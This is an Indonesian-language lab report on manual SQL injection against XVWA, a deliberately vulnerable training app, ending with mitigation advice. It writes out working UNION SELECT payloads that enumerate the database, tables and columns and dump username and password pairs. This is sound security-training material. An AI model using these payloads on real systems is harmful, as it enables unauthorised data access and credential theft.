# Laporan Latihan SQL Injection pada XVWA

## 📌 Deskripsi
Latihan ini dilakukan untuk memahami serangan SQL Injection menggunakan manual injection pada aplikasi XVWA (Xtreme Vulnerable Web Application).

## 🔧 Environment Setup
- **Target**: XVWA (Xtreme Vulnerable Web Application)
- **Metode**: Manual SQL Injection
- **Payload yang Digunakan**:
  ```sql
  ' UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema = database() #
  ```
- **Tools**:
  - XVWA di lingkungan **XAMPP/LAMP/WAMP**
  - Browser (Chrome)

## 🎯 Tujuan
1. Mengeksploitasi SQL Injection pada XVWA.
2. Mengambil daftar kolom dalam database saat ini.
3. Memahami struktur database target.

## 🏴 Proses Eksploitasi
1. **Identifikasi Formulir Rentan**
   - Mencari form input yang rentan terhadap SQL Injection.
   - Contoh: **Search Bar** di XVWA.

2. **Pengujian dengan Payload Sederhana**
   - Input awal `' OR '1'='1' #` untuk mengonfirmasi kerentanan.
   - Mengecek jumlah kolom pada database menggunakan `' ORDER BY {index_column} #`.
   - Melakukan UNION SELECT untuk enumerasi lebih lanjut.

3. **Menemukan Nama Database & User Database**
   - Untuk mengetahui nama database yang sedang digunakan:
     ```sql
     ' UNION SELECT 1,database(),3,4,5,6,7 #
     ```
   - Untuk mengetahui user database:
     ```sql
     ' UNION SELECT 1,user(),3,4,5,6,7 #
     ```
   - Output akan menunjukkan nama database dan user yang sedang digunakan oleh aplikasi.

4. **Penggunaan UNION SELECT untuk Enumerasi Kolom**
   - Input eksploitasi:
     ```sql
     ' UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema = database() #
     ```
   - **Hasil Output**: List kolom yang ada dalam database saat ini.

5. **Menemukan Nama Tabel**
   - Untuk mendapatkan daftar tabel dalam database yang sedang digunakan:
     ```sql
     ' UNION SELECT 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema = database() #
     ```
   - Output akan menampilkan daftar tabel yang ada dalam database.

6. **Mengambil Data dari Tabel Sensitif**
   - Setelah menemukan tabel yang relevan (misalnya `users`), data dapat diekstrak dengan query berikut:
     ```sql
     ' UNION SELECT 1,group_concat(username,'::',password,'<br>'),3,4,5,6,7 from users #
     ```
   - **Hasil Output**: Data username dan password dalam format "username::password".

## 🛠 Hasil Uji Coba
Berikut hasil eksekusi payload:
```plaintext
username, password
```
Kolom yang ditemukan menunjukkan struktur tabel yang berisi informasi akun.

## 🏆 Kesimpulan
- Payload berhasil menampilkan daftar kolom dalam database.
- SQL Injection masih menjadi ancaman serius bagi aplikasi yang tidak mengimplementasikan keamanan yang baik.

## 🔐 Rekomendasi Mitigasi
1. Gunakan **Prepared Statements (Parameterized Queries)** untuk mencegah SQL Injection.
2. Batasi hak akses database hanya untuk operasi yang diperlukan.
3. Implementasikan mekanisme **Web Application Firewall (WAF)**.
4. Filter dan validasi input pengguna sebelum diteruskan ke database.
